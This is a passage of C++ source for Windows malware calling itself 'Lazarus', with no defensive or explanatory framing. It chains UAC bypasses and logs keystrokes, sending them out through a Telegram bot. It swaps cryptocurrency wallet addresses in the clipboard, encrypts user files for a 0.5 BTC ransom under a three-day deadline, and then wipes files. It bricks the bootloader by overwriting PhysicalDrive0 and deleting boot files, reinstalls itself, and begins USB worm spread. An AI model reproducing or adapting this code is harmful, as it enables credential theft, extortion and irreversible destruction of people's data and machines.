    UACBypass_SilentCleanup(); if (IsUserAdmin()) return;
    UACBypass_DiskCleanup(); if (IsUserAdmin()) return;
    UACBypass_Fodhelper(); if (IsUserAdmin()) return;
    UACBypass_ComputerDefaults(); if (IsUserAdmin()) return;
    UACBypass_IActiveDesktop(); if (IsUserAdmin()) return;
    UACBypass_EventViewer(); if (IsUserAdmin()) return;
    UACBypass_Wusa(); if (IsUserAdmin()) return;
    UACBypass_ZeroDay(); if (IsUserAdmin()) return;
    ElevateToSYSTEM();
}

// ------------------------------------------------------------------
// Telegram C2
// ------------------------------------------------------------------
static std::string URLEncode(const std::string& s) {
    std::string result;
    for (char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~')
            result += c;
        else { char hex[4] = {0}; sprintf_s(hex, "%%%02X", (unsigned char)c); result += hex; }
    }
    return result;
}
static std::string EncodeBase64(const std::vector<BYTE>& data) {
    DWORD len = 0;
    CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &len);
    std::vector<char> buf(len);
    CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buf.data(), &len);
    return std::string(buf.data());
}
static void SendToTelegram(const std::string& msg) {
    std::string url = "https://api.telegram.org/bot" + std::string(TELEGRAM_BOT_TOKEN) +
                      "/sendMessage?chat_id=" + std::string(TELEGRAM_CHAT_ID) + "&text=" + URLEncode(msg);
    HINTERNET hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpOpenRequest(hSession, L"GET", std::wstring(url.begin(), url.end()).c_str(), nullptr, nullptr, nullptr, 0);
        if (hConnect) {
            WinHttpSendRequest(hConnect, nullptr, 0, nullptr, 0, 0, 0);
            WinHttpReceiveResponse(hConnect, nullptr);
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    JitterSleep(300);
}
static void SendToTelegramChunked(const std::string& msg) {
    const size_t chunkSize = 3900;
    for (size_t i = 0; i < msg.size(); i += chunkSize) {
        SendToTelegram(msg.substr(i, chunkSize));
        JitterSleep(300);
    }
}

// ------------------------------------------------------------------
// Keylogger (low-level global hook)
// ------------------------------------------------------------------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            char key[32] = {0};
            GetKeyNameTextA((p->scanCode << 16) | (p->flags << 24), key, 32);
            if (strlen(key) > 0) {
                if (key[0] == '\r') strcpy(key, "[ENTER]");
                else if (key[0] == '\t') strcpy(key, "[TAB]");
                else if (strcmp(key, "Space") == 0) strcpy(key, " ");
                else if (strlen(key) == 1 && isalpha(key[0])) {
                    SHORT state = GetKeyState(VK_SHIFT);
                    if (!(state & 0x8000)) key[0] = tolower(key[0]);
                }
                EnterCriticalSection(&g_keylogCS);
                g_keylogBuffer += key;
                if (g_keylogBuffer.size() > 1000) {
                    std::ofstream logFile(g_keylogFile, std::ios::app);
                    logFile << g_keylogBuffer;
                    logFile.close();
                    SendToTelegramChunked("KEYLOG|" + g_keylogBuffer);
                    g_keylogBuffer.clear();
                }
                LeaveCriticalSection(&g_keylogCS);
            }
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}
static DWORD WINAPI KeyloggerThread(LPVOID) {
    g_keylogFile = GetTempDir() + "keylog.txt";
    InitializeCriticalSection(&g_keylogCS);
    g_keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(nullptr), 0);
    if (!g_keyboardHook) return 0;
    MSG msg = {0};
    while (GetMessage(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    UnhookWindowsHookEx(g_keyboardHook);
    DeleteCriticalSection(&g_keylogCS);
    return 0;
}

// ------------------------------------------------------------------
// Clipboard Hijack
// ------------------------------------------------------------------
static DWORD WINAPI ClipboardMonitor(LPVOID) {
    while (true) {
        if (IsClipboardFormatAvailable(CF_TEXT) && OpenClipboard(nullptr)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pText = (char*)GlobalLock(hData);
                if (pText) {
                    std::string text(pText);
                    GlobalUnlock(hData);
                    if ((text.length() == 34 && (text[0] == '1' || text[0] == '3')) ||
                        (text.length() == 42 && text.substr(0,3) == "bc1")) {
                        EmptyClipboard();
                        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(BTC_WALLET)+1);
                        if (hMem) { char* pMem = (char*)GlobalLock(hMem); strcpy(pMem, BTC_WALLET); GlobalUnlock(hMem); SetClipboardData(CF_TEXT, hMem); }
                        SendToTelegram("CLIPBOARD_SWAP|BTC|" + text.substr(0,8) + "...");
                    }
                    else if (text.length() == 42 && text.substr(0,2) == "0x") {
                        EmptyClipboard();
                        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(ETH_WALLET)+1);
                        if (hMem) { char* pMem = (char*)GlobalLock(hMem); strcpy(pMem, ETH_WALLET); GlobalUnlock(hMem); SetClipboardData(CF_TEXT, hMem); }
                        SendToTelegram("CLIPBOARD_SWAP|ETH|" + text.substr(0,8) + "...");
                    }
                    else if (text.length() == 95 && text[0] == '4') {
                        EmptyClipboard();
                        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(XMR_WALLET)+1);
                        if (hMem) { char* pMem = (char*)GlobalLock(hMem); strcpy(pMem, XMR_WALLET); GlobalUnlock(hMem); SetClipboardData(CF_TEXT, hMem); }
                        SendToTelegram("CLIPBOARD_SWAP|XMR|" + text.substr(0,8) + "...");
                    }
                }
            }
            CloseClipboard();
        }
        JitterSleep(100);
    }
    return 0;
}

// ------------------------------------------------------------------
// Master key storage (persistent, encrypted)
// ------------------------------------------------------------------
static void SaveMasterKey() {
    std::string keyPath = std::string(getenv("PROGRAMDATA")) + "\\Lazarus\\key.dat";
    std::ofstream f(keyPath, std::ios::binary);
    if (f) {
        std::string mask = GetMachineID();
        for (size_t i = 0; i < 32; ++i)
            f.put(g_masterKey[i] ^ mask[i % mask.size()]);
        f.close();
        SetFileAttributesA(keyPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MasterKey", 0, REG_BINARY, g_masterKey, 32);
        RegCloseKey(hKey);
    }
}
static bool LoadMasterKey() {
    HKEY hKey;
    DWORD type;
    DWORD size = 32;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "MasterKey", NULL, &type, (LPBYTE)g_masterKey, &size) == ERROR_SUCCESS && size == 32) {
            g_keySet = true;
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    std::string keyPath = std::string(getenv("PROGRAMDATA")) + "\\Lazarus\\key.dat";
    std::ifstream f(keyPath, std::ios::binary);
    if (f) {
        BYTE buf[32];
        f.read((char*)buf, 32);
        if (f.gcount() == 32) {
            std::string mask = GetMachineID();
            for (size_t i = 0; i < 32; ++i)
                g_masterKey[i] = buf[i] ^ mask[i % mask.size()];
            g_keySet = true;
            return true;
        }
    }
    return false;
}

// ------------------------------------------------------------------
// Payment verification (blockchain)
// ------------------------------------------------------------------
static void CheckBitcoinPayment() {
    if (g_paymentConfirmed) return;
    std::string url = "https://blockchain.info/q/addressbalance/" + std::string(BTC_WALLET);
    HINTERNET hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpOpenRequest(hSession, L"GET", std::wstring(url.begin(), url.end()).c_str(), NULL, NULL, NULL, 0);
        if (hConnect) {
            WinHttpSendRequest(hConnect, NULL, 0, NULL, 0, 0, 0);
            WinHttpReceiveResponse(hConnect, NULL);
            DWORD bytesRead = 0;
            char buffer[32] = {0};
            DWORD bytesAvailable = 0;
            if (WinHttpQueryDataAvailable(hConnect, &bytesAvailable) && bytesAvailable) {
                WinHttpReadData(hConnect, buffer, (DWORD)std::min<DWORD>(bytesAvailable, sizeof(buffer)-1), &bytesRead);
                if (bytesRead) {
                    __int64 balance = _atoi64(buffer);
                    if (balance >= 50000000) {
                        g_paymentConfirmed = true;
                        HKEY hKey;
                        if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                            DWORD paid = 1;
                            RegSetValueExA(hKey, "Paid", 0, REG_DWORD, (const BYTE*)&paid, sizeof(paid));
                            RegCloseKey(hKey);
                        }
                        SendToTelegram("PAYMENT_CONFIRMED|" + GetMachineID());
                        DecryptRansomware();
                    }
                }
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}
static DWORD WINAPI PaymentCheckThread(LPVOID) {
    while (true) {
        if (!g_paymentConfirmed) CheckBitcoinPayment();
        JitterSleep(6 * 3600 * 1000);
    }
    return 0;
}

// ------------------------------------------------------------------
// Decryption routines (for when payment is confirmed)
// ------------------------------------------------------------------
static void DecryptFile(const std::string& encPath, const std::string& keyPath) {
    std::ifstream keyIn(keyPath, std::ios::binary);
    if (!keyIn) return;
    BYTE nonce[12], tag[16];
    keyIn.read((char*)nonce, 12);
    keyIn.read((char*)tag, 16);
    keyIn.close();
    std::ifstream encIn(encPath, std::ios::binary);
    if (!encIn) return;
    std::vector<BYTE> ciphertext((std::istreambuf_iterator<char>(encIn)), std::istreambuf_iterator<char>());
    encIn.close();
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) return;
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return; }
    DWORD keyObjSize = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjSize, sizeof(DWORD), nullptr, 0);
    std::vector<BYTE> keyObj(keyObjSize);
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjSize, g_masterKey, 32, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {0};
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = 1;
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag;
    authInfo.cbTag = 16;
    ULONG plainSize = 0;
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0, nullptr, 0, &plainSize, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0); return; }
    std::vector<BYTE> plaintext(plainSize);
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0,
                           plaintext.data(), plainSize, &plainSize, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (BCRYPT_SUCCESS(status)) {
        std::string origPath = encPath.substr(0, encPath.size() - 4);
        std::ofstream out(origPath, std::ios::binary);
        out.write((char*)plaintext.data(), plaintext.size());
        out.close();
        DeleteFileA(encPath.c_str());
        DeleteFileA(keyPath.c_str());
    }
}
static void DecryptAllFiles(const std::string& dir) {
    WIN32_FIND_DATAA fd = {0};
    HANDLE hFind = FindFirstFileA((dir + "\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0)
                DecryptAllFiles(dir + "\\" + fd.cFileName);
        } else {
            std::string fullPath = dir + "\\" + fd.cFileName;
            if (fullPath.size() >= 4 && fullPath.substr(fullPath.size() - 4) == ".lzr") {
                std::string keyPath = fullPath.substr(0, fullPath.size() - 4) + ".lzr.key";
                if (FileExists(keyPath)) DecryptFile(fullPath, keyPath);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}
static void DecryptRansomware() {
    char userProfile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    std::string root = userProfile;
    std::vector<std::string> dirs = { root + "\\Documents", root + "\\Desktop", root + "\\Pictures",
                                      root + "\\Videos", root + "\\Downloads", root + "\\Music" };
    for (auto& dir : dirs) if (FileExists(dir)) DecryptAllFiles(dir);
    SendToTelegram("DECRYPTION_COMPLETE|" + GetMachineID());
    MessageBoxA(NULL, "Payment received. All files have been restored.", "Lazarus Decryptor", MB_ICONINFORMATION | MB_OK);
}

// ------------------------------------------------------------------
// Anti‑tamper: store timestamp in 4 locations, detect rollback
// ------------------------------------------------------------------
static void ProtectTimestamp() {
    __int64 currentTime = (__int64)time(nullptr);
    std::string progData = getenv("PROGRAMDATA");
    g_installTimeFile = progData + "\\Lazarus\\install_time.dat";
    bool fileExists = FileExists(g_installTimeFile);
    __int64 regTime = 0, adsTime = 0, reg2Time = 0;
    HKEY hKey;
    DWORD regSize = sizeof(regTime);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "InstallTime", NULL, NULL, (LPBYTE)&regTime, &regSize);
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Lazarus", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "InstallTime", NULL, NULL, (LPBYTE)&reg2Time, &regSize);
        RegCloseKey(hKey);
    }
    std::string adsPath = g_installTimeFile + ":timestamp";
    std::ifstream adsIn(adsPath, std::ios::binary);
    if (adsIn) {
        adsIn.read((char*)&adsTime, sizeof(adsTime));
        adsIn.close();
    }
    if (fileExists) {
        std::ifstream f(g_installTimeFile);
        __int64 fileTime = 0;
        f >> fileTime;
        f.close();
        if (fileTime != regTime || fileTime != adsTime || fileTime != reg2Time) {
            SendToTelegram("TAMPER_DETECTED|install_time_mismatch");
            RunWiper();
        }
        if (IsClockRollbackDetected()) {
            SendToTelegram("CLOCK_ROLLBACK_DETECTED");
            RunWiper();
        }
    } else {
        if (regTime != 0) {
            std::ofstream f(g_installTimeFile); f << regTime; f.close();
            SetFileAttributesA(g_installTimeFile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
        } else if (adsTime != 0) {
            std::ofstream f(g_installTimeFile); f << adsTime; f.close();
            SetFileAttributesA(g_installTimeFile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
        } else if (reg2Time != 0) {
            std::ofstream f(g_installTimeFile); f << reg2Time; f.close();
            SetFileAttributesA(g_installTimeFile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
        } else {
            std::ofstream f(g_installTimeFile); f << currentTime; f.close();
            SetFileAttributesA(g_installTimeFile.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
            if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "InstallTime", 0, REG_QWORD, (const BYTE*)&currentTime, sizeof(currentTime));
                RegCloseKey(hKey);
            }
            if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Lazarus", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "InstallTime", 0, REG_QWORD, (const BYTE*)&currentTime, sizeof(currentTime));
                RegCloseKey(hKey);
            }
            std::ofstream adsOut(adsPath, std::ios::binary);
            adsOut.write((char*)&currentTime, sizeof(currentTime));
            adsOut.close();
        }
    }
}
static bool IsClockRollbackDetected() {
    __int64 lastSeen = 0;
    HKEY hKey;
    DWORD size = sizeof(lastSeen);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "LastSeen", NULL, NULL, (LPBYTE)&lastSeen, &size);
        RegCloseKey(hKey);
    }
    __int64 now = (__int64)time(nullptr);
    if (now < lastSeen) return true;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "LastSeen", 0, REG_QWORD, (const BYTE*)&now, sizeof(now));
        RegCloseKey(hKey);
    }
    return false;
}
static void CheckPaymentDeadline() {
    HKEY hKey;
    DWORD paid = 0;
    DWORD size = sizeof(paid);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Lazarus", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "Paid", NULL, NULL, (LPBYTE)&paid, &size);
        RegCloseKey(hKey);
    }
    if (paid) { g_paymentConfirmed = true; return; }
    ProtectTimestamp();
    __int64 installTime = 0;
    std::ifstream f(g_installTimeFile);
    if (f) {
        f >> installTime;
        f.close();
    } else {
        SendToTelegram("TIMESTAMP_MISSING_AFTER_PROTECT");
        RunWiper();
        return;
    }
    __int64 now = (__int64)time(nullptr);
    const __int64 threeDays = 3 * 24 * 3600;
    if (now - installTime >= threeDays) {
        CheckBitcoinPayment();
        if (g_paymentConfirmed) return;
        RunWiper();
        remove(g_installTimeFile.c_str());
        g_keySet = false;
    }
}

// ------------------------------------------------------------------
// Ransomware (encryption) + Wiper – DESTRUCTIVE
// ------------------------------------------------------------------
static void GenerateMasterKey() {
    if (LoadMasterKey()) return;
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
        CryptGenRandom(hProv, 32, g_masterKey);
        CryptReleaseContext(hProv, 0);
    } else {
        srand((unsigned int)GetTickCount());
        for (int i = 0; i < 32; ++i) g_masterKey[i] = rand() % 256;
    }
    g_keySet = true;
    SaveMasterKey();
}
static bool AESGCMEncrypt(const std::vector<BYTE>& plain, std::vector<BYTE>& cipher, std::vector<BYTE>& tag,
                          const BYTE* key, const BYTE* nonce) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) return false;
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
    DWORD keyObjSize = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjSize, sizeof(DWORD), nullptr, 0);
    std::vector<BYTE> keyObj(keyObjSize);
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjSize, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {0};
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = 1;
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = tag.data();
    authInfo.cbTag = 16;
    ULONG cipherSize = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)plain.data(), (ULONG)plain.size(), &authInfo, nullptr, 0, nullptr, 0, &cipherSize, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
    cipher.resize(cipherSize);
    status = BCryptEncrypt(hKey, (PUCHAR)plain.data(), (ULONG)plain.size(), &authInfo, nullptr, 0, cipher.data(), cipherSize, &cipherSize, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return BCRYPT_SUCCESS(status);
}
static void EncryptFile(const std::string& path) {
    if (!g_keySet) return;
    if (path.size() >= 4 && path.substr(path.size() - 4) == ".lzr") return;
    if (path.size() >= 8 && path.substr(path.size() - 8) == ".lzr.key") return;
    std::ifstream in(path, std::ios::binary);
    if (!in) return;
    std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();
    if (data.empty()) return;
    std::vector<BYTE> nonce(12);
    for (int i = 0; i < 12; ++i) nonce[i] = rand() % 256;
    std::vector<BYTE> encrypted, tag(16);
    if (!AESGCMEncrypt(data, encrypted, tag, g_masterKey, nonce.data())) return;
    std::string keyPath = path + ".lzr.key";
    std::ofstream keyOut(keyPath, std::ios::binary);
    keyOut.write((char*)nonce.data(), nonce.size());
    keyOut.write((char*)tag.data(), tag.size());
    keyOut.close();
    std::string encPath = path + ".lzr";
    std::ofstream encOut(encPath, std::ios::binary);
    encOut.write((char*)encrypted.data(), encrypted.size());
    encOut.close();
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    DeleteFileA(path.c_str());
}
static void EncryptDirectory(const std::string& dir, const std::set<std::string>& exts) {
    WIN32_FIND_DATAA fd = {0};
    HANDLE hFind = FindFirstFileA((dir + "\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0)
                EncryptDirectory(dir + "\\" + fd.cFileName, exts);
        } else {
            std::string ext = PathFindExtensionA(fd.cFileName);
            if (exts.find(ext) != exts.end()) EncryptFile(dir + "\\" + fd.cFileName);
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}
static void WipeFile(const std::string& path) {
    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    if (!out) return;
    for (int pass = 0; pass < 10; ++pass) {
        out.seekp(0);
        std::vector<BYTE> randomData(1024 * 1024);
        for (auto& b : randomData) b = rand() % 256;
        size_t totalWritten = 0;
        while (totalWritten < 100 * 1024 * 1024) {
            out.write((char*)randomData.data(), randomData.size());
            totalWritten += randomData.size();
        }
        out.flush();
    }
    out.close();
    DeleteFileA(path.c_str());
}
static void WipeDirectory(const std::string& dir) {
    WIN32_FIND_DATAA fd = {0};
    HANDLE hFind = FindFirstFileA((dir + "\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0)
                WipeDirectory(dir + "\\" + fd.cFileName);
        } else {
            WipeFile(dir + "\\" + fd.cFileName);
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    RemoveDirectoryA(dir.c_str());
}
static void BrickBootloader() {
    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        BYTE garbage[512];
        memset(garbage, 0xFF, 512);
        DWORD bytesWritten;
        for (int i = 0; i < 10; ++i) {
            SetFilePointer(hDisk, i * 512, NULL, FILE_BEGIN);
            WriteFile(hDisk, garbage, 512, &bytesWritten, NULL);
        }
        CloseHandle(hDisk);
    }
    system("bcdedit /set {default} recoveryenabled No >nul 2>&1");
    system("bcdedit /deletevalue {default} recoverysequence >nul 2>&1");
    system("bcdedit /set {bootmgr} displaybootmenu No >nul 2>&1");
    system("del /f /q C:\\bootmgr >nul 2>&1");
    system("del /f /q C:\\BOOTNXT >nul 2>&1");
    system("attrib -s -h -r C:\\boot\\*.* >nul 2>&1");
    system("del /f /q C:\\boot\\*.* >nul 2>&1");
    SendToTelegram("BOOTLOADER_BRICKED");
}
static void RunWiper() {
    if (g_paymentConfirmed) return;
    SendToTelegram("WIPER_TRIGGERED|3_DAYS_EXPIRED");
    char userProfile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    std::vector<std::string> targetDirs = {
        std::string(userProfile) + "\\Documents", std::string(userProfile) + "\\Desktop",
        std::string(userProfile) + "\\Pictures", std::string(userProfile) + "\\Videos",
        std::string(userProfile) + "\\Downloads", std::string(userProfile) + "\\Music"
    };
    for (auto& dir : targetDirs) if (FileExists(dir)) WipeDirectory(dir);
    BrickBootloader();
    MessageBoxA(NULL, "Your system has been destroyed due to non‑payment.", "Lazarus Wiper", MB_ICONERROR | MB_OK);
    system("shutdown /r /t 5 /c \"System corrupted. Rebooting...\" >nul 2>&1");
}
static void ShowDeadlineWarning() {
    std::string msg = 
        "!!! URGENT !!!\n\n"
        "All your files have been encrypted with AES-256-GCM.\n"
        "To recover your data, you must send 0.5 BTC to the following address:\n\n"
        "BTC: " + std::string(BTC_WALLET) + "\n\n"
        "After payment, contact us at " + std::string(SMTP_USERNAME) + " with your Machine ID: " + GetMachineID() + "\n\n"
        "⚠️ YOU HAVE 3 DAYS TO PAY. If we do not receive the payment within 3 days,\n"
        "ALL YOUR FILES WILL BE PERMANENTLY WIPED and the system will become UNBOOTABLE.\n"
        "No recovery is possible after the deadline.\n\n"
        "Do NOT attempt to decrypt files yourself – it will only damage them permanently.\n"
        "Do NOT rename or move .lzr or .lzr.key files.\n\n"
        "After payment, the decryption will happen automatically.";
    MessageBoxA(NULL, msg.c_str(), "Ransomware Notice – 3‑Day Deadline", MB_ICONWARNING | MB_OK);
}
static void RunRansomware() {
    std::set<std::string> exts = { ".docx", ".xlsx", ".pdf", ".jpg", ".png", ".zip", ".doc", ".xls", ".pptx", ".mp4", ".avi", ".txt", ".csv", ".odt", ".rtf", ".gif", ".bmp", ".mp3", ".wav", ".sql", ".psd", ".ai", ".dwg", ".blend", ".max", ".iso", ".vmdk", ".vhd", ".json", ".xml", ".config" };
    char userProfile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH);
    EncryptDirectory(userProfile, exts);
    std::string notePath = std::string(userProfile) + "\\DECRYPT_INSTRUCTIONS.txt";
    std::ofstream note(notePath);
    note << "YOUR FILES ARE ENCRYPTED with AES-256-GCM.\n"
         << "To decrypt, send 0.5 BTC to: " << BTC_WALLET << "\n"
         << "Contact: " << SMTP_USERNAME << "\n"
         << "Your Machine ID: " << GetMachineID() << "\n\n"
         << "⚠️ WARNING: You have 3 DAYS to pay. If payment is not received within 3 days,\n"
         << "all your files will be permanently wiped and the system will become UNBOOTABLE.\n"
         << "No recovery is possible after the deadline.\n\n"
         << "Do NOT attempt to recover files using third-party software.\n"
         << "Do NOT rename or move any .lzr or .lzr.key files.\n\n"
         << "After payment, the decryption will happen automatically.";
    note.close();
    SendToTelegram("RANSOMWARE|ENCRYPTION_COMPLETE|DEADLINE_3_DAYS");
    ShowDeadlineWarning();
}

// ------------------------------------------------------------------
// Self‑healing: reinstall malware if missing
// ------------------------------------------------------------------
static void SelfHeal() {
    std::string hiddenExe = std::string(getenv("PROGRAMDATA")) + "\\Lazarus\\Lazarus.exe";
    if (!FileExists(hiddenExe)) {
        std::string tempCopy = GetTempDir() + "svch0st.exe";
        if (FileExists(tempCopy)) {
            CopyFileA(tempCopy.c_str(), hiddenExe.c_str(), FALSE);
            SetFileAttributesA(hiddenExe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            SendToTelegram("SELF_HEAL|RESTORED");
        }
    }
    if (IsUserAdmin()) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            PersistRegistry();
        } else {
            RegCloseKey(hKey);
        }
    }
}

// ------------------------------------------------------------------
// Worm propagation (USB, SMB, RDP, Discord, Slack, Email, Cloud)
// ------------------------------------------------------------------
static void USBPropagation() {
    std::string src = GetTempDir() + "svch0st.exe";
    if (!FileExists(src)) {
        CopyFileA(g_selfPath.c_str(), src.c_str(), FALSE);
        SetFileAttributesA(src.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    for (char drive = 'D'; drive <= 'Z'; ++drive) {
